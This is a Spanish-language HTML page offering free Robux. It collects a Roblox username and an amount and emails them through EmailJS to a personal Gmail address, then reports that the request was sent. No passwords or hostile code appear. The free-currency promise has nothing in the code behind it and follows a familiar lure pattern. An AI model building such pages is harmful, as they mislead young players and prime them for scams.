<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consigue tus Robux</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('download.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            position: relative;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }
        .username-section {
            background-color: rgba(30, 30, 30, 1);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: inline-block;
            width: 220px; /* Ancho del cuadro de escritura */
            position: relative;
            z-index: 2;
        }
        .container {
            background-color: rgba(30, 30, 30, 1); /* Fondo gris oscuro */
            padding: 40px; /* Aumenta el padding para hacerlo más grande */
            border-radius: 10px;
            text-align: center;
            z-index: 2;
        }
        #info-section {
            margin: 20px 0;
            border: 1px solid white;
            border-radius: 10px;
            padding: 10px;
            cursor: pointer;
            display: inline-block;
            position: relative;
            z-index: 2;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
        }
        #info-content {
            display: none;
            margin-top: 10px;
            text-align: left;
            font-size: 14px;
        }
        footer {
            margin-top: auto;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            width: 100%;
            text-align: center;
        }
        input {
            text-align: center;
        }
        ::placeholder {
            font-size: 16px; 
            color: #aaa;
        }
        h1, h2 {
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
        }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <h1>Consigue tus Robux</h1>

    <div class="container">
        <section class="username-section">
            <label for="username" style="font-size: 20px; display: block; margin-bottom: 10px; color: white;">• Nombre de usuario de Roblox</label>
            <input type="text" id="username" name="username" placeholder="Introduce tu nombre de usuario..." 
                   required 
                   style="width: 100%; padding: 10px; border-radius: 10px; border: 1px solid #ccc; 
                          background-color: white; color: #333; font-size: 16px;"/>
            
            <div id="amount-section" style="display: none; margin-top: 20px;">
                <label for="amount" style="font-size: 20px; display: block; margin-bottom: 10px; color: white;">• Cantidad (hasta 999)</label>
                <input type="number" id="amount" name="amount" placeholder="Introduce cantidad..." 
                       max="999" required 
                       style="width: 100%; padding: 10px; border-radius: 10px; border: 1px solid #ccc; 
                              background-color: white; color: #333; font-size: 16px; text-align: center;"/>
            </div>
            
            <button id="submit-button" type="button" style="width: auto; padding: 8px; border: none; border-radius: 5px; 
                                    background-color: #28a745; color: white; font-size: 16px; cursor: pointer; 
                                    margin-top: 10px;">Siguiente</button>

            <div id="confirmation-message" style="margin-top: 20px; color: white; display: none;"></div>
        </section>

        <div id="info-section" onclick="toggleInfo()">
            <h2>Información de la página</h2>
            <div id="info-content">
                <p>Dada la situación actual de estafas, aquí pueden solicitar Robux gratis. Ingresen su usuario y cantidad.</p>
            </div>
        </div>
    </div>

    <footer>
        © 2023 Ocamie. Todos los derechos reservados.
    </footer>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("YOUR_USER_ID"); // Reemplaza con tu ID de usuario de EmailJS
        })();

        document.querySelector('#username').addEventListener('input', function() {
            const amountSection = document.getElementById('amount-section');
            amountSection.style.display = this.value ? 'block' : 'none';
        });

        document.getElementById('submit-button').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const amount = document.getElementById('amount').value;
            
            if (username && amount) {
                const templateParams = {
                    username: username,
                    amount: amount,
                    to_email: 'ocamie.info@gmail.com' // Tu correo para recibir la notificación
                };

                emailjs.send('service_nnndb0n', 'YOUR_TEMPLATE_ID', templateParams)
                    .then(function(response) {
                        console.log('SUCCESS!', response.status, response.text);
                        const confirmationMessage = `Se ha enviado su solicitud para entregar Robux al usuario "${username}" por ${amount} Robux. Recibirás actualizaciones pronto.`;
                        document.getElementById('confirmation-message').innerText = confirmationMessage;
                        document.getElementById('confirmation-message').style.display = 'block';
                    }, function(error) {
                        console.error('FAILED...', error);
                        const errorMessage = 'Ocurrió un error al enviar su solicitud: ' + JSON.stringify(error);
                        document.getElementById('confirmation-message').innerText = errorMessage;
                        document.getElementById('confirmation-message').style.display = 'block';
                    });
            } else {
                const errorMessage = 'Por favor, complete todos los campos.';
                document.getElementById('confirmation-message').innerText = errorMessage;
                document.getElementById('confirmation-message').style.display = 'block';
            }
        });

        function toggleInfo() {
            const content = document.getElementById('info-content');
            content.style.display = content.style.display === 'none' ? 'block' : 'none';
        }
    </script>
</body>
</html>
